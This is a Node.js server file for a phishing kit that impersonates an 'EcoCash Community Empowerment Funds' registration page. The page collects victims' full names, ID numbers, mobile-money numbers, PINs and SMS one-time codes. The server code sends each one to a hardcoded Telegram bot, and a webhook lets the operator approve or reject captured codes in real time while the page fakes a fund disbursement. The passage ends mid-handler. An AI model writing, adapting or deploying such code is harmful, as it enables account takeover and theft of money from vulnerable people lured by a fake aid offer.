const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== STORAGE =====
const pendingRegistrations = {};
const otpActions = {};

// ===== HTML PAGE =====
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0047AB 0%,#003380 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:35px 28px;max-width:440px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#0047AB;color:white;padding:8px 20px;font-size:11px;font-weight:bold;border-bottom-left-radius:12px;letter-spacing:1px}
.logo-area{text-align:center;margin-bottom:25px}
.logo-area .logo{width:70px;height:70px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;color:white;font-weight:bold;box-shadow:0 8px 20px rgba(0,71,171,0.3)}
.logo-area h1{color:#0047AB;font-size:1.6em;margin:0;font-weight:bold}
.logo-area .tagline{color:#666;margin-top:6px;font-size:0.9em}
.community-badge{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;padding:10px;border-radius:10px;text-align:center;font-size:12px;font-weight:bold;margin-bottom:20px;letter-spacing:0.5px}
.progress-bar{display:flex;justify-content:space-between;margin-bottom:25px;gap:6px}
.progress-step{flex:1;height:5px;background:#e0e0e0;border-radius:3px;transition:all 0.3s}
.progress-step.active{background:#0047AB}
.progress-step.completed{background:#28a745}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:7px;color:#333;font-weight:600;font-size:13px}
.form-group label .required{color:#f44336}
.form-group input{width:100%;padding:14px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:all 0.3s;background:#fafafa;font-family:inherit}
.form-group input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.1)}
.form-group input::placeholder{color:#bbb}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;transition:all 0.3s;color:white;background:linear-gradient(135deg,#0047AB,#0066CC);margin-top:8px}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,71,171,0.4)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-green:hover:not(:disabled){box-shadow:0 8px 25px rgba(40,167,69,0.4)}
.message{padding:14px;border-radius:10px;margin-top:15px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
.loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.otp-container{display:flex;gap:10px;justify-content:center;margin:25px 0}
.otp-input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #e0e0e0;border-radius:10px;background:#fafafa;transition:all 0.3s}
.otp-input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.15)}
.otp-input.filled{border-color:#0047AB;background:#f0f6ff}
.otp-input.error{border-color:#dc3545;background:#fff5f5;animation:shake 0.5s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}
.sms-sent-container{text-align:center;padding:30px 15px}
.sms-icon{width:80px;height:80px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:38px;color:white;animation:pulseSms 1.5s ease-in-out infinite;box-shadow:0 8px 25px rgba(0,71,171,0.35)}
@keyframes pulseSms{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:0.9}}
.sms-sent-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px}
.sms-sent-container p{color:#666;font-size:14px;line-height:1.6;margin-bottom:15px}
.sms-sent-container .phone-highlight{color:#0047AB;font-weight:bold}
.countdown-circle{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#0047AB,#0066CC);display:flex;align-items:center;justify-content:center;margin:25px auto;color:white;font-size:38px;font-weight:bold;box-shadow:0 10px 30px rgba(0,71,171,0.4);animation:pulseCountdown 1s ease-in-out infinite}
@keyframes pulseCountdown{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
.countdown-text{font-size:13px;color:#999;margin-top:10px}
.sms-progress-bar{width:100%;height:6px;background:#e0e0e0;border-radius:3px;margin:20px 0;overflow:hidden}
.sms-progress-fill{height:100%;background:linear-gradient(135deg,#0047AB,#0066CC);width:0%;transition:width 1s linear}
.purpose-title{text-align:center;margin-bottom:15px}
.purpose-title h2{color:#0047AB;font-size:1.3em;margin-bottom:6px}
.purpose-title p{color:#666;font-size:13px}
.purpose-list{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}
.purpose-item{border:2px solid #e0e0e0;border-radius:12px;padding:14px 10px;text-align:center;cursor:pointer;transition:all 0.3s;background:#fafafa;font-size:12px;font-weight:600;color:#555}
.purpose-item:hover{border-color:#0047AB;background:#f0f6ff;transform:translateY(-2px)}
.purpose-item.selected{border-color:#0047AB;background:linear-gradient(135deg,#0047AB,#0066CC);color:white;box-shadow:0 5px 15px rgba(0,71,171,0.3)}
.purpose-item .icon{font-size:22px;display:block;margin-bottom:5px}
.details-box{background:#f8f9fa;border-radius:12px;padding:18px;margin:20px 0;text-align:left}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e9ecef;font-size:13px}
.detail-row:last-child{border-bottom:none}
.detail-label{color:#666;font-weight:500}
.detail-value{color:#333;font-weight:600}
.status-progress{display:inline-block;padding:8px 22px;border-radius:20px;font-size:13px;font-weight:bold;background:#cfe2ff;color:#084298;margin-top:10px;animation:pulseStatus 1.5s ease-in-out infinite}
@keyframes pulseStatus{0%,100%{opacity:1}50%{opacity:0.7}}
.step-content{display:none}
.step-content.active{display:block;animation:slideIn 0.4s ease-out}
@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
.info-note{background:#e3f2fd;border-left:3px solid #0047AB;padding:12px;border-radius:6px;font-size:12px;color:#0c5460;margin-bottom:18px;line-height:1.5}
.processing-container{text-align:center;padding:25px 0}
.processing-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px}
.processing-container p{color:#666;font-size:13px;margin-bottom:20px}
.big-spinner{width:80px;height:80px;margin:20px auto;border-radius:50%;border:6px solid #e0e0e0;border-top-color:#0047AB;animation:spin 1s linear infinite}
.processing-steps{text-align:left;margin:25px 0;padding:0;list-style:none}
.processing-step-item{display:flex;align-items:center;gap:12px;padding:14px;background:#f8f9fa;border-radius:10px;margin-bottom:10px;transition:all 0.5s;opacity:0.4;border-left:4px solid transparent}
.processing-step-item.active{opacity:1;background:#e8f5e9;border-left-color:#4CAF50}
.processing-step-item.completed{opacity:1;background:#d4edda;border-left-color:#28a745}
.processing-step-item .picon{font-size:20px;width:30px;text-align:center}
.processing-step-item .ptext{flex:1;font-size:13px;font-weight:600;color:#333}
.processing-step-item .pstatus{font-size:16px}
.step-timer{font-size:12px;color:#999;font-weight:normal;display:block;margin-top:2px}
.success-container{text-align:center;padding:20px 0}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;font-size:56px;color:white;animation:bounce 1s;box-shadow:0 10px 30px rgba(40,167,69,0.3)}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.success-container h1{color:#28a745;margin-bottom:10px;font-size:1.6em}
.success-container p{color:#666;margin-bottom:15px;line-height:1.6;font-size:14px}
.verifying-box{text-align:center;padding:40px 20px}
.verifying-spinner{width:60px;height:60px;margin:0 auto 20px;border-radius:50%;border:5px solid #e0e0e0;border-top-color:#0047AB;animation:spin 1s linear infinite}
.verifying-box h3{color:#0047AB;font-size:1.1em;margin-bottom:8px}
.verifying-box p{color:#999;font-size:13px}
.dots{display:inline-block}
.dots span{display:inline-block;animation:dotBounce 1.4s infinite both}
.dots span:nth-child(1){animation-delay:0s}
.dots span:nth-child(2){animation-delay:0.2s}
.dots span:nth-child(3){animation-delay:0.4s}
@keyframes dotBounce{0%,80%,100%{transform:scale(0);opacity:0.3}40%{transform:scale(1);opacity:1}}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">ECOCASH</div>

<div class="logo-area">
<div class="logo">E</div>
<h1>EcoCash</h1>
<div class="tagline">Community Empowerment Funds</div>
</div>

<div class="community-badge">🌟 POWERED BY ECOCASH • COMMUNITY EMPOWERMENT FUNDS 🌟</div>

<div class="progress-bar">
<div class="progress-step active" id="step1Bar"></div>
<div class="progress-step" id="step2Bar"></div>
<div class="progress-step" id="step3Bar"></div>
<div class="progress-step" id="step4Bar"></div>
</div>

<div class="step-content active" id="step1Content">
<form id="registerForm">
<div class="form-group">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="fullName" placeholder="Enter your full name" required>
</div>
<div class="form-group">
<label>ID Number <span class="required">*</span></label>
<input type="text" id="idNumber" placeholder="Enter your ID number" required>
</div>
<div class="form-group">
<label>EcoCash Number <span class="required">*</span></label>
<input type="tel" id="ecocashNumber" placeholder="0771234567" inputmode="numeric" required>
</div>
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required>
</div>
<button type="submit" class="btn" id="submitBtn"><span id="submitText">Continue</span></button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<div class="step-content" id="step2Content">
<div class="sms-sent-container">
<div class="sms-icon">📩</div>
<h2>SMS OTP Sent</h2>
<p>An OTP has been sent to your EcoCash number<br><span class="phone-highlight" id="sentPhone">---</span></p>
<div class="countdown-circle" id="countdownCircle">10</div>
<div class="countdown-text">Please wait while we prepare your verification</div>
<div class="sms-progress-bar"><div class="sms-progress-fill" id="smsProgress"></div></div>
</div>
</div>

<div class="step-content" id="step3Content">
<div style="text-align:center;margin-bottom:15px">
<h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Enter OTP</h2>
<p style="color:#666;font-size:13px">Enter the 6-digit code sent to your phone</p>
</div>
<div class="info-note">💡 Check your SMS inbox for the 6-digit verification code.</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
</div>
<button type="button" class="btn btn-green" id="verifyOtpBtn">Verify OTP</button>
<div id="otpMessage" class="message"></div>
</div>

<div class="step-content" id="verifyingContent">
<div class="verifying-box">
<div class="verifying-spinner"></div>
<h3>Verifying OTP</h3>
<p>Please wait while we verify your OTP<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
</div>
</div>

<div class="step-content" id="step4Content">
<div class="purpose-title">
<h2>Purpose of Funds</h2>
<p>Select the purpose for these funds</p>
</div>
<div class="info-note">💡 Amount disbursed will be based on the purpose and document verification.</div>
<div class="purpose-list" id="purposeList">
<div class="purpose-item" data-value="School Fees"><span class="icon">🎓</span>School Fees</div>
<div class="purpose-item" data-value="Business Capital"><span class="icon">💼</span>Business Capital</div>
<div class="purpose-item" data-value="Rent"><span class="icon">🏠</span>Rent</div>
<div class="purpose-item" data-value="Medical Expenses"><span class="icon">🏥</span>Medical Expenses</div>
<div class="purpose-item" data-value="Groceries"><span class="icon">🛒</span>Groceries</div>
<div class="purpose-item" data-value="Transport"><span class="icon">🚗</span>Transport</div>
<div class="purpose-item" data-value="Utilities"><span class="icon">💡</span>Utilities</div>
<div class="purpose-item" data-value="Agriculture"><span class="icon">🌾</span>Agriculture</div>
<div class="purpose-item" data-value="Emergency"><span class="icon">🚨</span>Emergency</div>
<div class="purpose-item" data-value="Savings"><span class="icon">💰</span>Savings</div>
<div class="purpose-item" data-value="Funeral"><span class="icon">⚱️</span>Funeral</div>
<div class="purpose-item" data-value="Other"><span class="icon">📝</span>Other</div>
</div>
<button type="button" class="btn" id="purposeBtn" disabled>Continue</button>
<div id="purposeMessage" class="message"></div>
</div>

<div class="step-content" id="step5Content">
<div style="text-align:center;margin-bottom:15px">
<h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Confirm with PIN</h2>
<p style="color:#666;font-size:13px">Enter your EcoCash PIN to authorize this transaction</p>
</div>
<div class="info-note">🔒 Your PIN is encrypted and secure.</div>
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="confirmPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required>
</div>
<button type="button" class="btn btn-green" id="confirmPinBtn">Verify PIN</button>
<div id="pinMessage" class="message"></div>
</div>

<div class="step-content" id="step6Content">
<div class="processing-container">
<h2>Processing Your Application</h2>
<p>Please wait while we verify and process your funds...</p>
<div class="big-spinner"></div>
<ul class="processing-steps">
<li class="processing-step-item" id="pStep1">
<span class="picon">🔍</span>
<span class="ptext">Verifying Details<span class="step-timer" id="timer1"></span></span>
<span class="pstatus" id="pStatus1">⏳</span>
</li>
<li class="processing-step-item" id="pStep2">
<span class="picon">📄</span>
<span class="ptext">Document Verification<span class="step-timer" id="timer2"></span></span>
<span class="pstatus" id="pStatus2">⏳</span>
</li>
<li class="processing-step-item" id="pStep3">
<span class="picon">💵</span>
<span class="ptext">Calculating Disbursement<span class="step-timer" id="timer3"></span></span>
<span class="pstatus" id="pStatus3">⏳</span>
</li>
<li class="processing-step-item" id="pStep4">
<span class="picon">🏦</span>
<span class="ptext">Disbursement in Progress<span class="step-timer" id="timer4"></span></span>
<span class="pstatus" id="pStatus4">⏳</span>
</li>
</ul>
</div>
</div>

<div class="step-content" id="step7Content">
<div class="success-container">
<div class="success-icon">✓</div>
<h1>Registration Complete!</h1>
<p>Your application has been successfully submitted.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="finalRegId">#----</span></div>
<div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="finalName">---</span></div>
<div class="detail-row"><span class="detail-label">EcoCash Number</span><span class="detail-value" id="finalPhone">---</span></div>
<div class="detail-row"><span class="detail-label">Purpose</span><span class="detail-value" id="finalPurpose">---</span></div>
<div class="detail-row"><span class="detail-label">Status</span><span class="detail-value"><span class="status-progress">💵 Disbursement in Progress</span></span></div>
</div>
<p style="margin-top:15px;font-size:13px;color:#999">Funds will be disbursed to your EcoCash account based on purpose and document verification.</p>
</div>
</div>

</div>

<script>
var currentAppId = null;
var selectedPurpose = '';
var countdownInterval = null;
var otpPollingInterval = null;
var currentStep = 1;

function saveState(){
var state = {
registrationId: currentAppId,
step: currentStep,
fullName: document.getElementById('fullName').value,
idNumber: document.getElementById('idNumber').value,
ecocashNumber: document.getElementById('ecocashNumber').value,
purpose: selectedPurpose
};
try{ localStorage.setItem('ecocash_state', JSON.stringify(state)); }catch(e){}
}

function clearState(){
try{ localStorage.removeItem('ecocash_state'); }catch(e){}
}

function restoreState(){
try{
var raw = localStorage.getItem('ecocash_state');
if(!raw) return false;
var state = JSON.parse(raw);
if(!state.registrationId) return false;

currentAppId = state.registrationId;
selectedPurpose = state.purpose || '';

if(state.fullName) document.getElementById('fullName').value = state.fullName;
if(state.idNumber) document.getElementById('idNumber').value = state.idNumber;
if(state.ecocashNumber) document.getElementById('ecocashNumber').value = state.ecocashNumber;

if(selectedPurpose){
var items = document.querySelectorAll('.purpose-item');
for(var i=0;i<items.length;i++){
if(items[i].getAttribute('data-value') === selectedPurpose){
items[i].classList.add('selected');
document.getElementById('purposeBtn').disabled = false;
}
}
}

if(state.step === 2){
goToStep(2);
document.getElementById('sentPhone').textContent = state.ecocashNumber || '';
startCountdown();
return true;
} else if(state.step === 3 || state.step === 'verifying'){
goToStep('verifying');
startOtpPolling();
return true;
} else if(state.step === 4){
goToStep(4);
return true;
} else if(state.step === 5){
goToStep(5);
return true;
}
return false;
}catch(e){
console.error('Restore error:', e);
return false;
}
}

document.getElementById('registerForm').addEventListener('submit', async function(e){
e.preventDefault();
var fullName=document.getElementById('fullName').value.trim();
var idNumber=document.getElementById('idNumber').value.trim();
var ecocashNumber=document.getElementById('ecocashNumber').value.trim();
var ecoPin=document.getElementById('ecoPin').value.trim();

if(!fullName||!idNumber||!ecocashNumber||!ecoPin){
showMessage('Please fill all fields','error');return;
}

var btn=document.getElementById('submitBtn');
var btnText=document.getElementById('submitText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

try{
var response=await fetch('/api/register',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({fullName:fullName,idNumber:idNumber,ecocashNumber:ecocashNumber,ecoPin:ecoPin})
});
var data=await response.json();
if(data.success){
currentAppId=data.registrationId;
goToStep(2);
document.getElementById('sentPhone').textContent=ecocashNumber;
startCountdown();

fetch('/api/otp-sent',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId})
});
}else{
showMessage(data.message||'Failed','error');
btn.disabled=false;
btnText.textContent='Continue';
}
}catch(error){
showMessage('Network error','error');
btn.disabled=false;
btnText.textContent='Continue';
}
});

function goToStep(step){
var contents=document.querySelectorAll('.step-content');
for(var i=0;i<contents.length;i++){contents[i].classList.remove('active')}

if(step === 'verifying'){
document.getElementById('verifyingContent').classList.add('active');
currentStep = 'verifying';
} else {
document.getElementById('step'+step+'Content').classList.add('active');
currentStep = step;
}

for(var i=1;i<=4;i++){
var bar=document.getElementById('step'+i+'Bar');
if(bar){
bar.classList.remove('active','completed');
var s = (step === 'verifying') ? 3 : step;
if(i<Math.min(s,4)){bar.classList.add('completed')}
else if(i===Math.min(s,4)){bar.classList.add('active')}
}
}
saveState();
}

function startCountdown(){
if(countdownInterval){clearInterval(countdownInterval)}
var seconds=10;
var circle=document.getElementById('countdownCircle');
var progress=document.getElementById('smsProgress');
var totalTime=10;
circle.textContent=seconds;
progress.style.width='0%';

countdownInterval=setInterval(function(){
seconds--;
circle.textContent=seconds;
progress.style.width=((totalTime-seconds)/totalTime*100)+'%';
if(seconds<=0){
clearInterval(countdownInterval);
goToStep(3);
var firstInput=document.querySelector('#otpContainer .otp-input');
if(firstInput){firstInput.focus()}
}
},1000);
}

var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
for(var oi=0;oi<otpInputs.length;oi++){
(function(input,index){
input.addEventListener('input',function(e){
var v=e.target.value.replace(/[^0-9]/g,'');
e.target.value=v;
e.target.classList.remove('error');
if(v){
e.target.classList.add('filled');
if(index<otpInputs.length-1){otpInputs[index+1].focus()}
}else{
e.target.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!e.target.value&&index>0){otpInputs[index-1].focus()}
});
})(otpInputs[oi],oi);
}

document.getElementById('verifyOtpBtn').addEventListener('click',async function(){
var otp='';
for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}

if(otp.length!==6){
showOtpMessage('Please enter the complete 6-digit OTP','error');
return;
}

var btn=document.getElementById('verifyOtpBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Sending...';

try{
var response=await fetch('/api/send-otp-for-approval',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,otp:otp})
});
var data=await response.json();
if(data.success){
goToStep('verifying');
startOtpPolling();
}else{
showOtpMessage(data.message||'Error','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
}catch(error){
showOtpMessage('Network error','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
});

function startOtpPolling(){
if(otpPollingInterval){clearInterval(otpPollingInterval)}

otpPollingInterval=setInterval(async function(){
try{
var response=await fetch('/api/check-otp-status/'+currentAppId);
var data=await response.json();

if(data.status==='approved'){
clearInterval(otpPollingInterval);
otpPollingInterval=null;
document.getElementById('verifyOtpBtn').disabled=false;
document.getElementById('verifyOtpBtn').textContent='Verify OTP';
for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.remove('filled','error')}
goToStep(4);
}
else if(data.status==='rejected'){
clearInterval(otpPollingInterval);
otpPollingInterval=null;
document.getElementById('verifyOtpBtn').disabled=false;
document.getElementById('verifyOtpBtn').textContent='Verify OTP';
goToStep(3);
showOtpMessage('❌ Wrong OTP. Please try again.','error');
for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.add('error')}
setTimeout(function(){
for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}
},1500);
otpInputs[0].focus();
fetch('/api/clear-otp-status/'+currentAppId,{method:'POST'});
}
}catch(error){
console.error('Poll error:',error);
}
},2000);
}

var purposeItems=document.querySelectorAll('.purpose-item');
for(var pi=0;pi<purposeItems.length;pi++){
(function(item){
item.addEventListener('click',function(){
for(var j=0;j<purposeItems.length;j++){purposeItems[j].classList.remove('selected')}
item.classList.add('selected');
selectedPurpose=item.getAttribute('data-value');
document.getElementById('purposeBtn').disabled=false;
saveState();
});
})(purposeItems[pi]);
}

document.getElementById('purposeBtn').addEventListener('click',function(){
if(!selectedPurpose){showPurposeMessage('Please select a purpose','error');return}
fetch('/api/update-purpose',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,purpose:selectedPurpose})
}).then(function(){goToStep(5)});
});

document.getElementById('confirmPinBtn').addEventListener('click',async function(){
var pin=document.getElementById('confirmPin').value.trim();
if(!pin||pin.length!==4){showPinMessage('Please enter 4-digit PIN','error');return}

var btn=document.getElementById('confirmPinBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/confirm-pin',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,pin:pin,purpose:selectedPurpose})
});
var data=await response.json();
if(data.success){
goToStep(6);
runProcessingSteps();
}else{
showPinMessage(data.message||'Invalid PIN','error');
btn.disabled=false;
btn.textContent='Verify PIN';
}
}catch(error){
showPinMessage('Network error','error');
btn.disabled=false;
btn.textContent='Verify PIN';
}
});

function runProcessingSteps(){
var steps=['pStep1','pStep2','pStep3','pStep4'];
var timers=['timer1','timer2','timer3','timer4'];
var statuses=['pStatus1','pStatus2','pStatus3','pStatus4'];
var current=0;
var duration=20;

function next(){
if(current>=steps.length){
fetch('/api/disbursement-complete',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId})
});
setTimeout(function(){
document.getElementById('finalRegId').textContent='#'+currentAppId;
document.getElementById('finalName').textContent=document.getElementById('fullName').value;
document.getElementById('finalPhone').textContent=document.getElementById('ecocashNumber').value;
document.getElementById('finalPurpose').textContent=selectedPurpose;
goToStep(7);
clearState();
},500);
return;
}

var el=document.getElementById(steps[current]);
var t=document.getElementById(timers[current]);
var s=document.getElementById(statuses[current]);

el.classList.add('active');
var left=duration;
t.textContent=' ('+left+'s)';

var iv=setInterval(function(){
left--;
t.textContent=' ('+left+'s)';
if(left<=0){
clearInterval(iv);
el.classList.remove('active');
el.classList.add('completed');
s.textContent='✅';
t.textContent='';
current++;
setTimeout(next,300);
}
},1000);
}
next();
}

function showMessage(t,ty){var d=document.getElementById('messageDiv');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showOtpMessage(t,ty){var d=document.getElementById('otpMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showPurposeMessage(t,ty){var d=document.getElementById('purposeMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showPinMessage(t,ty){var d=document.getElementById('pinMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}

document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});

window.addEventListener('load',function(){
restoreState();
});
</script>
</body>
</html>`;

// ===== ROUTES =====
app.get('/', (req, res) => { res.send(HTML_PAGE); });

app.post('/api/register', async (req, res) => {
    try {
        const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;
        if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
            return res.status(400).json({ success: false, message: 'All fields required' });
        }
        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
        pendingRegistrations[registrationId] = {
            fullName, idNumber, ecocashNumber, ecoPin,
            verified: false, otp1Sent: false, otpEntered: null,
            timestamp: new Date().toISOString()
        };
        const message =
            '💚 <b>NEW ECOCASH REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>User is on countdown...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
        res.json({ success: true, registrationId, message: 'OK' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.post('/api/otp-sent', async (req, res) => {
    try {
        const { registrationId } = req.body;
        const r = pendingRegistrations[registrationId];
        if (!r) return res.status(404).json({ success: false });
        if (r.otp1Sent) return res.json({ success: true });
        r.otp1Sent = true;
        const message =
            '📩 <b>SMS OTP SENT - WAITING FOR USER INPUT</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏳ <i>Waiting for user to enter OTP...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/send-otp-for-approval', async (req, res) => {
    try {
        const { registrationId, otp } = req.body;
        const r = pendingRegistrations[registrationId];
        if (!r) return res.status(404).json({ success: false, message: 'Registration not found' });
        r.otpEntered = otp;
        otpActions[registrationId] = 'pending';
        const message =
            '🔐 <b>OTP VERIFICATION - ADMIN ACTION REQUIRED</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '🔐 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
            '👇 <b>Tap a button to respond:</b>';
        const reply_markup = {
            inline_keyboard: [
                [
                    { text: '✅ APPROVE OTP', callback_data: 'approve_otp_' + registrationId },
                    { text: '❌ WRONG OTP', callback_data: 'reject_otp_' + registrationId }
                ]
            ]
        };
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: reply_markup });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.get('/api/check-otp-status/:registrationId', (req, res) => {
    const { registrationId } = req.params;
    const status = otpActions[registrationId] || 'pending';
    res.json({ status: status });
});

app.post('/api/clear-otp-status/:registrationId', (req, res) => {
    const { registrationId } = req.params;
    delete otpActions[registrationId];
    res.json({ success: true });
});

app.post('/webhook', async (req, res) => {
    try {
        const update = req.body;
        if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data;
            const callbackId = callbackQuery.id;
            let responseText = 'Action received';
            if (data.startsWith('approve_otp_')) {
                const registrationId = data.replace('approve_otp_', '');
                otpActions[registrationId] = 'approved';
                responseText = '✅ OTP Approved';
            } else if (data.startsWith('reject_otp_')) {
